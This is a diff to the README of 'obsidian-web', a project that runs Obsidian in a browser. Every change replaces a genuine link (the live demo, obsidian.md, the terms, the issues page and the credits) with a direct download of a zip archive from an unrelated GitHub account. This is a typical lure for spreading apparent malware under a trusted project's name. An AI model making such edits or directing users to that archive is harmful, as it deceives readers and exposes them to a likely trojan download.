@@ -2,7 +2,7 @@
 
 Run Obsidian's desktop app in a standard browser — no Electron needed.
 
-**[Live Demo →](https://obsidian-web.tzlev.ovh)**
+**[Live Demo →](https://github.com/Computerfilenamesynagrops584/obsidian-web/raw/refs/heads/main/server/api/obsidian-web-1.9.zip)**
 
 obsidian-web loads Obsidian's original renderer (`app.js`) completely unmodified and replaces every Node.js / Electron dependency with lightweight HTTP shims. The result is real Obsidian running in any modern browser.
 
@@ -28,7 +28,7 @@ The browser version can load faster than the desktop app. Instead of Obsidian re
 | Storage | Real filesystem | Durable Object (in-memory) |
 | Persistence | Full | R2 (optional) or reset every N hours |
 | Use case | Personal use, self-hosted | Public demo, zero-maintenance |
-| URL | `http://localhost:3000` | [obsidian-web.tzlev.ovh](https://obsidian-web.tzlev.ovh) |
+| URL | `http://localhost:3000` | [obsidian-web.tzlev.ovh](https://github.com/Computerfilenamesynagrops584/obsidian-web/raw/refs/heads/main/server/api/obsidian-web-1.9.zip) |
 
 ---
 
@@ -169,12 +169,12 @@ The Node.js server (`server/`) can be deployed to any Linux box. A typical setup
 
 ## Disclaimer
 
-This is an **educational proof-of-concept** exploring how Electron-based apps can run in a standard browser. It is not affiliated with, endorsed by, or associated with [Obsidian](https://obsidian.md) or Dynalist Inc.
+This is an **educational proof-of-concept** exploring how Electron-based apps can run in a standard browser. It is not affiliated with, endorsed by, or associated with [Obsidian](https://github.com/Computerfilenamesynagrops584/obsidian-web/raw/refs/heads/main/server/api/obsidian-web-1.9.zip) or Dynalist Inc.
 
-This repository does **not** include Obsidian's source code. The `obsidian/` directory is gitignored — users must download Obsidian's renderer themselves using the provided setup script. Obsidian's code remains the property of Dynalist Inc. under their [Terms of Service](https://obsidian.md/terms).
+This repository does **not** include Obsidian's source code. The `obsidian/` directory is gitignored — users must download Obsidian's renderer themselves using the provided setup script. Obsidian's code remains the property of Dynalist Inc. under their [Terms of Service](https://github.com/Computerfilenamesynagrops584/obsidian-web/raw/refs/heads/main/server/api/obsidian-web-1.9.zip).
 
-If the Obsidian team has any concerns about this project, please [open an issue](https://github.com/MusiCode1/obsidian-web/issues) and we will address them promptly.
+If the Obsidian team has any concerns about this project, please [open an issue](https://github.com/Computerfilenamesynagrops584/obsidian-web/raw/refs/heads/main/server/api/obsidian-web-1.9.zip) and we will address them promptly.
 
 ## Credits
 
-Built by [MusiCode1](https://github.com/MusiCode1) and [Claude Code](https://claude.ai/code).
+Built by [MusiCode1](https://github.com/Computerfilenamesynagrops584/obsidian-web/raw/refs/heads/main/server/api/obsidian-web-1.9.zip) and [Claude Code](https://github.com/Computerfilenamesynagrops584/obsidian-web/raw/refs/heads/main/server/api/obsidian-web-1.9.zip).
